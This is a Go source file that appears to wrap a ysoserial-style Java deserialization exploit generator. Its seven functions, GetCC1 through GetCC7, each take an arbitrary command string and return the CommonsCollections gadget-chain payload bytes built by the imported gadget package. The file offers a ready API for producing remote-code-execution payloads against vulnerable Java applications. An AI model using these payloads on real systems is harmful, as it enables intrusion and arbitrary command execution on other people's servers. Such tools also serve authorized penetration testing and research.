package gososerial

import (
	"github.com/EmYiQing/Gososerial/ysoserial/gadget"
)

func GetCC1(cmd string) []byte {
	return gadget.GetCommonsCollections1(cmd)
}

func GetCC2(cmd string) []byte {
	return gadget.GetCommonsCollections2(cmd)
}

func GetCC3(cmd string) []byte {
	return gadget.GetCommonsCollections3(cmd)
}

func GetCC4(cmd string) []byte {
	return gadget.GetCommonsCollections4(cmd)
}

func GetCC5(cmd string) []byte {
	return gadget.GetCommonsCollections5(cmd)
}

func GetCC6(cmd string) []byte {
	return gadget.GetCommonsCollections6(cmd)
}

func GetCC7(cmd string) []byte {
	return gadget.GetCommonsCollections7(cmd)
}
